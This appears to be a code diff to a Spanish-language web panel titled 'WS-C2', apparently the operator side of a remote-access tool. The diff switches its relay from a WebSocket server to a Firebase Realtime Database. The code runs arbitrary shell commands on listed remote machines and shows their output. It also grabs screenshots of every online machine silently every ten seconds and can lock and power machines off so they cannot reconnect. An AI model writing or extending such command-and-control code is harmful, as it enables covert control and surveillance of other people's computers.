@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>cmd (WebSocket)</title>
+  <title>cmd</title>
   <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- Font Awesome para iconos -->
@@ -75,9 +75,9 @@
 
   <div class="container mx-auto p-4 max-w-7xl md:pr-[17rem]">
     <header class="flex justify-between items-center mb-6">
-      <h1 class="text-2xl font-bold text-white">(: WS-C2</h1>
+      <h1 class="text-2xl font-bold text-white">(:</h1>
       <div class="text-right">
-          <div id="status" class="text-sm font-medium text-yellow-500">Desconectado</div>
+          <div id="status" class="text-sm font-medium">Conectando...</div>
           <div id="auto-ss-status" class="text-xs text-cyan-500 animate-pulse" style="display:none;">Auto-Screenshot: ON</div>
       </div>
     </header>
@@ -85,7 +85,7 @@
     <main>
       <!-- Cuadrícula de Máquinas -->
       <div id="machines-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
-        <p class="text-gray-400 col-span-full">Esperando conexión WebSocket...</p>
+        <p class="text-gray-400 col-span-full">Esperando máquinas...</p>
       </div>
 
       <!-- Panel de Consola (oculto por defecto) -->
@@ -196,19 +196,25 @@
     </div>
   </div>
 
-  <!-- Lógica WebSocket -->
-  <script>
-    // --- CONFIGURACIÓN WEBSOCKET ---
-    // Cambia esto a la IP/Puerto de tu servidor WebSocket (Backend)
-    const WS_URL = "ws://localhost:8080"; 
-    // ------------------------------
+  <!-- SDK de Firebase -->
+  <script type="module">
+    // Importa las funciones que necesitas
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, onValue, set, remove, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-    let socket = null;
-    let reconnectInterval = null;
+    // --- Configuración de Firebase ---
+    const firebaseConfig = {
+      databaseURL: "https://cmdapp-e276d-default-rtdb.europe-west1.firebasedatabase.app",
+    };
+    // ---------------------------------
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
     let machines = {};
     let lockedMachines = {};
     let selected = null;
+    let globalResponseListener = null;
+    let globalScreenshotListener = null;
     let lastScreenshotId = null;
     let currentCWD = "..."; 
 
@@ -253,7 +259,7 @@
         for (let i = 0; i < binStr.length; i++) {
           utf8Bytes[i] = binStr.charCodeAt(i);
         }
-        const decoder = new TextDecoder('windows-1252'); // Asumiendo encoding común de CMD
+        const decoder = new TextDecoder('windows-1252'); 
         return decoder.decode(utf8Bytes);
       } catch (e) {
         return b64; 
@@ -261,8 +267,7 @@
     }
 
     function adjustTimestamp(timestamp) {
-      // Ajuste de zona horaria si viene en UTC o local diferente
-      return timestamp; 
+      return timestamp - (2 * 60 * 60); // 2 horas en segundos
     }
     
     // --- Funciones de Modales ---
@@ -290,7 +295,7 @@
       onConfirmCallback = null;
     }
     function showScreenshot(name, b64data, timestamp) {
-      const ssDate = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
+      const ssDate = new Date(adjustTimestamp(timestamp) * 1000).toLocaleString();
       screenshotTitle.textContent = `Captura de ${name} (${ssDate})`;
       screenshotImage.src = "data:image/png;base64," + b64data; 
       screenshotModal.style.display = 'flex';
@@ -318,7 +323,9 @@
         confirmBtnYes.classList.add('opacity-50', 'cursor-not-allowed');
       }
     };
-    
+    function encodeKey(s) {
+      return s.replace(/[.\$\[\]#\/ ]/g, "_");
+    }
     function updateConsolePrompt() {
         if (!currentCWD || currentCWD === "...") {
             consoleInputSpan.textContent = "...>";
@@ -327,7 +334,6 @@
             consoleInputSpan.textContent = `${cleanCWD}>`;
         }
     }
-    
     function addToConsole(text, type = 'response') {
         const line = document.createElement('div');
         if (type === 'user') {
@@ -357,7 +363,7 @@
       const sortedNames = Array.from(allMachineNames).sort();
 
       if (sortedNames.length === 0) {
-        machinesGridEl.innerHTML = "<p class='text-gray-400 col-span-full'>No hay máquinas conectadas...</p>";
+        machinesGridEl.innerHTML = "<p class='text-gray-400 col-span-full'>No hay máquinas reportando...</p>";
         return;
       }
 
@@ -373,9 +379,7 @@
         const ip = info.ip ? atob_utf8(info.ip) : '...';
         const cwd = info.cwd ? atob_utf8(info.cwd).replace(/\\+/g, '\\') : '...';
         
-        // Asumiendo que lastSeen viene en timestamp MS desde el servidor WS
-        const lastSeen = status.lastSeen ? new Date(status.lastSeen) : null;
-        
+        const lastSeen = status.lastSeen ? new Date(adjustTimestamp(status.lastSeen) * 1000) : null;
         const el = machineTpl.content.cloneNode(true);
         const cardDiv = el.querySelector('.machine-grid-card');
         
@@ -420,6 +424,7 @@
           el.querySelector('.unlock-btn').onclick = () => sendUnlock(name);
           cardDiv.classList.add('border-2', 'border-red-700');
           el.querySelector('.sys-os').textContent = 'Bloqueado';
+          // Ocultar foto si está bloqueado? O dejarla? La dejamos.
 
         } else if (lastSeen && (Date.now() - lastSeen.getTime()) < 30000) {
           // --- MÁQUINA ONLINE ---
@@ -470,8 +475,7 @@
           return;
       }
       const status = machineNode.status || {};
-      const lastSeen = status.lastSeen ? new Date(status.lastSeen) : null;
-      
+      const lastSeen = status.lastSeen ? new Date(adjustTimestamp(status.lastSeen) * 1000) : null;
       if (!lastSeen || (Date.now() - lastSeen.getTime()) >= 30000) {
           showConfirm("Máquina Offline", `La máquina ${name} parece estar offline. (Última vez vista: ${lastSeen ? lastSeen.toLocaleString() : 'Nunca'}). No se puede conectar.`, () => {}, null);
           return;
@@ -490,13 +494,62 @@
       updateConsolePrompt();
       addToConsole(`Conectado a ${name}.`, 'info');
 
-      // (Los listeners son manejados globalmente por el onmessage del socket)
+      if (globalResponseListener) globalResponseListener();
+      if (globalScreenshotListener) globalScreenshotListener();
+
+      const responseRef = ref(db, `machines/${encodeKey(name)}/lastResponse`);
+      globalResponseListener = onValue(responseRef, (snapshot) => {
+        const data = snapshot.val();
+        if (data && data.hasOwnProperty('response')) {
+            const plainResponse = atob_utf8(data.response);
+            
+            let isAudioResponse = false;
+            try {
+              const jsonString = plainResponse.replace(/'/g, '"');
+              const parsed = JSON.parse(jsonString);
+
+              if (parsed && parsed.URL && parsed.Text) {
+                isAudioResponse = true;
+                const speaker = parsed.Speaker || 'Voz';
+                addToConsole(`[Audio de ${speaker}]: ${parsed.Text}`, 'info'); 
+                const audio = new Audio(parsed.URL);
+                audio.play().catch(e => {
+                  console.error("Error al reproducir audio:", e);
+                  addToConsole(`Error: No se pudo auto-reproducir el audio (click del usuario requerido?). ${e.message}`, 'error');
+                });
+              }
+            } catch (e) {
+              // No es un JSON
+            }
+
+            if (!isAudioResponse) {
+              addToConsole(plainResponse, 'response');
+            }
+        }
+      }, (error) => {
+        addToConsole(`Error escuchando respuestas: ${error.message}`, 'error');
+      });
+
+      const screenshotRef = ref(db, `machines/${encodeKey(name)}/screenshot`);
+      globalScreenshotListener = onValue(screenshotRef, (snapshot) => {
+        const data = snapshot.val();
+        if (data && data.data && data.id !== lastScreenshotId) {
+          lastScreenshotId = data.id;
+          showScreenshot(name, data.data, data.timestamp);
+        }
+      }, (error) => {
+        addToConsole(`Error escuchando screenshots: ${error.message}`, 'error');
+      });
 
       panelEl.scrollIntoView({ behavior: 'smooth' });
       cmdInputEl.focus();
     }
 
     function closePanel() {
+        if (globalResponseListener) globalResponseListener();
+        if (globalScreenshotListener) globalScreenshotListener();
+        globalResponseListener = null;
+        globalScreenshotListener = null;
         selected = null;
         panelEl.style.display = "none";
         machinesGridEl.style.display = "grid";
@@ -507,38 +560,33 @@
     }
 
 
-    // --- Lógica de Comandos WebSocket ---
+    // --- Lógica de Comandos ---
 
     /**
-     * Envía un mensaje por el WebSocket
+     * Envía un comando a Firebase
      */
-    function sendWsMessage(type, payload) {
-        if (!socket || socket.readyState !== WebSocket.OPEN) {
-            addToConsole("Error: WebSocket desconectado.", 'error');
-            return Promise.reject("WebSocket no conectado");
-        }
-        const message = JSON.stringify({
-            type: type,
-            ...payload
-        });
-        socket.send(message);
-        return Promise.resolve();
-    }
-
-    /**
-     * Enviar comando
-     */
-    async function sendRemoteCommand(name, cmd, cwd) {
+    async function sendFirebaseCommand(name, cmd, cwd, clearAfter6s = true) {
         const id = "cmd-" + Date.now();
+        const payload = { id: id, cmd: cmd, cwd: cwd };
+        const cmdRef = ref(db, `machines/${encodeKey(name)}/command`);
+
         try {
-            await sendWsMessage('EXECUTE', {
-                target: name,
-                command: cmd,
-                cwd: cwd,
-                id: id
-            });
+            await set(cmdRef, payload);
+            
+            if (clearAfter6s) {
+                setTimeout(async () => {
+                    try {
+                        const snapshot = await get(cmdRef);
+                        if (snapshot.exists() && snapshot.val().id === id) {
+                            await remove(cmdRef);
+                        }
+                    } catch (e) {
+                        console.error(`Error al borrar comando (${cmd}) para ${name}:`, e);
+                    }
+                }, 6000); // 6 segundos
+            }
         } catch (e) {
-            console.error(`Error al enviar comando: ${e}`);
+            console.error(`Error al enviar comando: ${e.message}`);
             throw e; 
         }
     }
@@ -550,9 +598,9 @@
       
       showConfirm(`Confirmar ${actionName}`, `¿Estás seguro de que quieres enviar el comando "${cmd}" a ${name}?`, async () => {
         try {
-          await sendRemoteCommand(name, cmd, "C:\\");
+          await sendFirebaseCommand(name, cmd, "C:\\", true);
         } catch (e) {
-          showConfirm("Error de conexión", `Error al enviar comando: ${e}`, () => {});
+          showConfirm("Error de Firebase", `Error al enviar comando: ${e.message}`, () => {});
         }
       });
     }
@@ -588,7 +636,6 @@
         }
         return result;
     }
-
     function handleLocalCommand(cmd) {
         addToConsole(cmd, 'user'); 
         const cmdLower = cmd.toLowerCase().trim();
@@ -610,6 +657,7 @@
             updateConsolePrompt();
         }
     }
+
 
     /**
      * Envía un comando desde la consola
@@ -646,29 +694,27 @@
 
     async function sendCommandInternal(cmd) {
         try {
-          // Si es un comando de screenshot, a veces se maneja con tipo diferente, 
-          // pero aqui lo mandamos como EXECUTE normal, y el agente lo procesa.
-          // O si prefieres un tipo específico:
-          if (cmd.trim().toLowerCase() === '/screenshot') {
-             await sendWsMessage('SCREENSHOT_REQ', { target: selected });
-          } else {
-             await sendRemoteCommand(selected, cmd, currentCWD);
-             addToConsole(cmd, 'user');
+          await sendFirebaseCommand(selected, cmd, currentCWD, true);
+          
+          if (cmd.toLowerCase() !== '/screenshot') {
+            addToConsole(cmd, 'user');
           }
         } catch (e) {
-          addToConsole(`Error al enviar comando: ${e}`, 'error');
+          addToConsole(`Error al enviar comando: ${e.message}`, 'error');
         }
     }
 
     async function sendLock(name) {
         showConfirm("Confirmar Bloqueo",
-          `¿Estás seguro de que quieres BLOQUEAR y APAGAR ${name}?\nLa máquina no podrá volver a conectarse hasta que la desbloquees manualmente desde aquí.`,
+          `¿Estás seguro de que quieres BLOQUEAR y APAGAR ${name}?\nLa máquina no podrá volver a conectarse hasta que la desbloquees manually desde aquí.`,
           async () => {
             try {
-              await sendWsMessage('LOCK_MACHINE', { target: name });
+              const lockRef = ref(db, `lock/${encodeKey(name)}`);
+              await set(lockRef, "locked");
+              await sendFirebaseCommand(name, "/lock", "C:\\", true);
             } catch (e) {
-              console.error(`Error al bloquear: ${e}`);
-              showConfirm("Error WS", `Error al enviar bloqueo: ${e}`, () => {});
+              console.error(`Error al bloquear: ${e.message}`);
+              showConfirm("Error de Firebase", `Error al bloquear: ${e.message}`, () => {});
             }
           }
         );
@@ -676,13 +722,14 @@
 
     async function sendUnlock(name) {
         showConfirm("Confirmar Desbloqueo",
-          `¿Estás seguro de que quieres DESBLOQUEAR ${name}?\nEsto permitirá que el script se ejecute la próxima vez que la máquina se inicie manualmente.`,
+          `¿Estás seguro de que quieres DESBLOQUEAR ${name}?\nEsto permitirá que el script se ejecute la próxima vez que la máquina se inicie manually.`,
           async () => {
             try {
-              await sendWsMessage('UNLOCK_MACHINE', { target: name });
+              const lockRef = ref(db, `lock/${encodeKey(name)}`);
+              await remove(lockRef);
             } catch (e) {
-              console.error(`Error al desbloquear: ${e}`);
-              showConfirm("Error WS", `Error al enviar desbloqueo: ${e}`, () => {});
+              console.error(`Error al desbloquear: ${e.message}`);
+              showConfirm("Error de Firebase", `Error al desbloquear: ${e.message}`, () => {});
             }
           }
         );
@@ -691,19 +738,25 @@
     // --- NUEVO: Bucle automático de Screenshot ---
     function startAutoScreenshotLoop() {
         setInterval(() => {
-            // SOLO si no estamos en una consola (selected == null) y el socket está abierto
-            if (!selected && socket && socket.readyState === WebSocket.OPEN) {
+            // SOLO si no estamos en una consola (selected == null)
+            if (!selected) {
                 const now = Date.now();
                 // Iterar sobre todas las máquinas
                 Object.keys(machines).forEach(name => {
                     const node = machines[name];
                     const status = node.status || {};
-                    const lastSeen = status.lastSeen ? new Date(status.lastSeen) : null;
+                    // Calcular lastSeen
+                    const lastSeen = status.lastSeen ? new Date(adjustTimestamp(status.lastSeen) * 1000) : null;
                     
                     // Solo enviar si la máquina se ha visto en los últimos 30 segundos (ONLINE)
                     if (lastSeen && (now - lastSeen.getTime()) < 30000) {
                         // Enviar comando silenciosamente
-                        sendWsMessage('SCREENSHOT_REQ', { target: name })
+                        // Usamos C:\ como CWD genérico
+                        sendFirebaseCommand(name, "/screenshot", "C:\\", true)
+                        .then(() => {
+                            // Opcional: Console log para debug
+                            // console.log(`Auto-screenshot enviado a ${name}`);
+                        })
                         .catch(err => console.error("Auto-ss error:", err));
                     }
                 });
@@ -711,112 +764,29 @@
         }, 10000); // 10000 ms = 10 segundos
     }
 
-    // --- WebSocket Logic Core ---
-    function connectWebSocket() {
-        statusEl.textContent = "Conectando WS...";
-        statusEl.className = "text-sm font-medium text-yellow-500";
-        
-        socket = new WebSocket(WS_URL);
+    // --- Inicialización y Listeners ---
+    function listenToFirebase() {
+      statusEl.textContent = "Conectado a Firebase.";
+      statusEl.classList.add('text-green-400');
+      autoSsStatusEl.style.display = "block"; // Mostrar indicador
 
-        socket.onopen = () => {
-            console.log("WebSocket conectado");
-            statusEl.textContent = "WS Conectado";
-            statusEl.className = "text-sm font-medium text-green-400";
-            autoSsStatusEl.style.display = "block";
-            machinesGridEl.innerHTML = ""; 
-            // Solicitar estado inicial si el servidor lo requiere
-            // sendWsMessage('SYNC', {}); 
-        };
+      onValue(ref(db, 'machines'), (snapshot) => {
+        machines = snapshot.val() || {};
+        renderMachines();
+      }, (error) => {
+        statusEl.textContent = `Error (machines): ${error.message}`;
+        statusEl.classList.add('text-red-400');
+      });
 
-        socket.onmessage = (event) => {
-            try {
-                const msg = JSON.parse(event.data);
-                handleWsMessage(msg);
-            } catch (e) {
-                console.error("Error parseando mensaje WS:", e);
-            }
-        };
-
-        socket.onclose = () => {
-            console.log("WebSocket desconectado");
-            statusEl.textContent = "WS Desconectado";
-            statusEl.className = "text-sm font-medium text-red-500";
-            autoSsStatusEl.style.display = "none";
-            
-            // Reintentar conexión
-            setTimeout(connectWebSocket, 3000);
-        };
-
-        socket.onerror = (err) => {
-            console.error("WebSocket error:", err);
-            socket.close();
-        };
+      onValue(ref(db, 'lock'), (snapshot) => {
+        lockedMachines = snapshot.val() || {};
+        renderMachines();
+      }, (error) => {
+        statusEl.textContent = `Error (lock): ${error.message}`;
+        statusEl.classList.add('text-red-400');
+      });
     }
-
-    function handleWsMessage(msg) {
-        // --- PROTOCOLO ESPERADO DESDE EL SERVIDOR ---
-        // msg.type: 'UPDATE_MACHINES' | 'UPDATE_LOCKS' | 'CMD_RESPONSE' | 'SCREENSHOT_DATA'
-        
-        switch(msg.type) {
-            case 'UPDATE_MACHINES':
-                // Se espera que msg.data contenga el objeto completo de máquinas
-                machines = msg.data || {};
-                renderMachines();
-                break;
-            
-            case 'UPDATE_LOCKS':
-                lockedMachines = msg.data || {};
-                renderMachines();
-                break;
-
-            case 'CMD_RESPONSE':
-                // { type: 'CMD_RESPONSE', target: 'PC-1', response: 'Base64...' }
-                if (selected && selected === msg.target) {
-                    const plainResponse = atob_utf8(msg.response);
-                    
-                    let isAudioResponse = false;
-                    try {
-                        const jsonString = plainResponse.replace(/'/g, '"');
-                        const parsed = JSON.parse(jsonString);
-                        if (parsed && parsed.URL && parsed.Text) {
-                            isAudioResponse = true;
-                            addToConsole(`[Audio de ${parsed.Speaker || 'Voz'}]: ${parsed.Text}`, 'info'); 
-                            const audio = new Audio(parsed.URL);
-                            audio.play().catch(e => addToConsole("Error audio: " + e.message, 'error'));
-                        }
-                    } catch (e) {}
-
-                    if (!isAudioResponse) {
-                        addToConsole(plainResponse, 'response');
-                    }
-                }
-                break;
-
-            case 'SCREENSHOT_DATA':
-                // { type: 'SCREENSHOT_DATA', target: 'PC-1', data: 'Base64Image...', timestamp: 123456789 }
-                if (msg.target) {
-                    // Actualizar dato en memoria local para el Grid
-                    if (!machines[msg.target]) machines[msg.target] = {};
-                    machines[msg.target].screenshot = {
-                        data: msg.data,
-                        timestamp: msg.timestamp || Date.now()
-                    };
-                    
-                    // Si estamos viendo el modal de ese target, actualizarlo
-                    if (screenshotModal.style.display !== 'none' && screenshotTitle.textContent.includes(msg.target)) {
-                        showScreenshot(msg.target, msg.data, msg.timestamp);
-                    }
-                    
-                    renderMachines();
-                }
-                break;
-            
-            default:
-                console.warn("Tipo de mensaje desconocido:", msg.type);
-        }
-    }
-
-    // Inicializar
+    
     cmdFormEl.onsubmit = (e) => {
         e.preventDefault();
         const cmd = cmdInputEl.value.trim();
@@ -833,9 +803,8 @@
     closePanelBtn.onclick = closePanel;
     screenshotCloseBtn.onclick = hideScreenshot; 
 
-    // Arrancar
-    connectWebSocket();
-    startAutoScreenshotLoop();
+    listenToFirebase();
+    startAutoScreenshotLoop(); // Iniciar el bucle
 
   </script>
 </body>
